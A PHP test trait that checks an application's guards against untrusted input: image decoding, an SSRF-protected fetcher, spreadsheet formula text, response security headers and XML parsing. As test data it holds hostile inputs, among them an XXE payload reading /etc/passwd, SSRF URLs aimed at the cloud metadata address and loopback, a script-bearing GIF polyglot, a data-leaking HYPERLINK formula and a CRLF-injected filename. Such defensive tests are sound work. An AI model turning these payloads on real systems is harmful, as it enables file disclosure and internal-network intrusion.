<?php

declare(strict_types=1);

namespace DDD\Testing\UntrustedInput;

use DDD\Domain\Common\Entities\MediaItems\ExcelDocument;
use DDD\Infrastructure\Services\GuardedHttpFetchService;
use DDD\Infrastructure\Services\UntrustedInputRuntimeCheckService;
use DDD\Infrastructure\Untrusted\GuardedHttpFetchResult;
use DDD\Infrastructure\Untrusted\RasterImageDecoder;
use DDD\Infrastructure\Untrusted\SafeXml;
use DDD\Infrastructure\Untrusted\UnsupportedImageFormatException;
use DDD\Infrastructure\Untrusted\UntrustedContentException;
use DDD\Infrastructure\Untrusted\UntrustedContentHeaders;
use DDD\Presentation\Base\Dtos\ImageResponseDto;
use DDD\Presentation\Base\Dtos\UntrustedContentResponseDto;
use ImagickException;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Reader\Xlsx as XlsxReader;
use Symfony\Component\HttpClient\MockHttpClient;
use Symfony\Component\HttpClient\Response\MockResponse;
use Symfony\Contracts\HttpClient\HttpClientInterface;

/**
 * Behaviour tests of the untrusted-input rule, reusable by every package and application: a test class of the
 * application uses this trait (on whatever base class boots its framework objects) and so proves the rule on the
 * application's own ImageMagick build, Core version and configuration. No network is used.
 *
 *     class UntrustedInputBehaviourTest extends KernelTestCase   // or the suite's own base
 *     {
 *         use UntrustedInputBehaviourTestTrait;
 *     }
 */
trait UntrustedInputBehaviourTestTrait
{
    public function testInterpreterBodiesAreRefusedBeforeImagick(): void
    {
        foreach (UntrustedInputFixtures::INTERPRETER_BODIES as $bodyName => $body) {
            $this->assertNull(RasterImageDecoder::detectFormat($body), $bodyName);
            try {
                RasterImageDecoder::readBlob($body);
                $this->fail("{$bodyName} was decoded");
            } catch (UnsupportedImageFormatException) {
                $this->addToAssertionCount(1);
            }
        }
    }

    public function testPolyglotWithARasterHeaderIsDecodedOnlyByItsRasterCoder(): void
    {
        $polyglotBody = "GIF89a/*\x00\x00*/=1;<html><script>alert(1)</script></html>";
        $this->assertSame(RasterImageDecoder::FORMAT_GIF, RasterImageDecoder::detectFormat($polyglotBody));
        try {
            RasterImageDecoder::readBlob($polyglotBody);
            $this->fail('A broken GIF was decoded');
        } catch (ImagickException) {
            $this->addToAssertionCount(1);
        }
    }

    public function testRealRasterImageIsDecoded(): void
    {
        $pngBytes = $this->createTinyPng();
        $imagick = RasterImageDecoder::readBlob($pngBytes);
        $this->assertSame(3, $imagick->getImageWidth());
        $this->assertSame('PNG', strtoupper($imagick->getImageFormat()));
        $this->assertSame(2, RasterImageDecoder::probe($pngBytes)->height);
    }

    public function testFetcherRefusesPrivateAndRedirectedToPrivateAddresses(): void
    {
        $guardedHttpFetchService = $this->createOfflineGuardedHttpFetchService([
            new MockResponse('', ['http_code' => 302, 'response_headers' => ['Location: http://169.254.169.254/latest/meta-data/']]),
        ]);
        foreach (['http://127.0.0.1/', 'http://10.0.0.1/', 'http://169.254.169.254/', 'http://[::1]/', 'http://[::ffff:10.0.0.1]/', 'file:///etc/passwd', 'gopher://93.184.215.14/'] as $refusedUrl) {
            $this->assertSame(GuardedHttpFetchResult::REASON_BLOCKED, $guardedHttpFetchService->fetch($refusedUrl)->refusalReason, $refusedUrl);
        }
        $redirectedFetchResult = $guardedHttpFetchService->fetch('http://93.184.215.14/start');
        $this->assertSame(GuardedHttpFetchResult::REASON_BLOCKED, $redirectedFetchResult->refusalReason);
        $this->assertSame('http://169.254.169.254/latest/meta-data/', $redirectedFetchResult->finalUrl);
        $this->assertSame('', $redirectedFetchResult->body);
    }

    public function testFetcherCapsTheBody(): void
    {
        $guardedHttpFetchService = $this->createOfflineGuardedHttpFetchService([
            new MockResponse(str_repeat('a', 5000), ['http_code' => 200, 'response_headers' => ['Content-Type: text/plain']]),
        ]);
        $guardedHttpFetchResult = $guardedHttpFetchService->fetch('http://93.184.215.14/large', 1000);
        $this->assertTrue($guardedHttpFetchResult->isTruncated);
        $this->assertSame(1000, strlen($guardedHttpFetchResult->body));
    }

    public function testFormulaStringStaysTextInXlsx(): void
    {
        $excelDocument = ExcelDocument::fromArray([['=HYPERLINK("https://example.invalid/?"&B1,"click")', '42', 'plain']], ['a', 'b', 'c']);
        $xlsxPath = tempnam(sys_get_temp_dir(), 'xlsx');
        file_put_contents($xlsxPath, $excelDocument->mediaItemContent->getBody());
        try {
            $worksheet = (new XlsxReader())->load($xlsxPath)->getActiveSheet();
            $this->assertSame(DataType::TYPE_STRING, $worksheet->getCell('A2')->getDataType());
            $this->assertSame('=HYPERLINK("https://example.invalid/?"&B1,"click")', $worksheet->getCell('A2')->getValue());
            $this->assertSame(DataType::TYPE_NUMERIC, $worksheet->getCell('B2')->getDataType());
        } finally {
            @unlink($xlsxPath);
        }
    }

    public function testResponsesForForeignBytesCarryTheSecurityHeaders(): void
    {
        $untrustedContentResponseDto = new UntrustedContentResponseDto('<html></html>', 'text/html; charset=utf-8', "a\"b\r\n.html", true);
        $this->assertSame(UntrustedContentHeaders::OPAQUE_CONTENT_TYPE, $untrustedContentResponseDto->headers->get('Content-Type'));
        $this->assertSame('nosniff', $untrustedContentResponseDto->headers->get('X-Content-Type-Options'));
        $this->assertStringContainsString('sandbox', (string)$untrustedContentResponseDto->headers->get('Content-Security-Policy'));
        $this->assertStringStartsWith('attachment', (string)$untrustedContentResponseDto->headers->get('Content-Disposition'));
        $this->assertStringNotContainsString("\n", (string)$untrustedContentResponseDto->headers->get('Content-Disposition'));

        $inlineImageResponseDto = new UntrustedContentResponseDto('x', 'image/png', 'a.png', true);
        $this->assertStringStartsWith('inline', (string)$inlineImageResponseDto->headers->get('Content-Disposition'));

        $imageResponseDto = new ImageResponseDto('<html></html>', contentType: 'text/html');
        $this->assertSame(UntrustedContentHeaders::OPAQUE_CONTENT_TYPE, $imageResponseDto->headers->get('Content-Type'));
        $this->assertSame('nosniff', $imageResponseDto->headers->get('X-Content-Type-Options'));
    }

    public function testXmlWithDoctypeOrEntitiesIsRefused(): void
    {
        $this->expectException(UntrustedContentException::class);
        SafeXml::loadXml('<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>');
    }

    /**
     * A fetcher that resolves only literal IP hosts (no DNS) and answers from the given responses (no network).
     * @param MockResponse[] $mockResponses
     * @return GuardedHttpFetchService
     */
    protected function createOfflineGuardedHttpFetchService(array $mockResponses): GuardedHttpFetchService
    {
        return new class ($mockResponses) extends GuardedHttpFetchService {
            /** @param MockResponse[] $mockResponses */
            public function __construct(protected array $mockResponses)
            {
            }

            protected function createHttpClient(): HttpClientInterface
            {
                return new MockHttpClient($this->mockResponses);
            }
        };
    }

    /**
     * @return string a 3×2 PNG (no GD needed)
     */
    protected function createTinyPng(): string
    {
        return (string)base64_decode(UntrustedInputRuntimeCheckService::RASTER_PROBE_PNG_BASE64, true);
    }
}
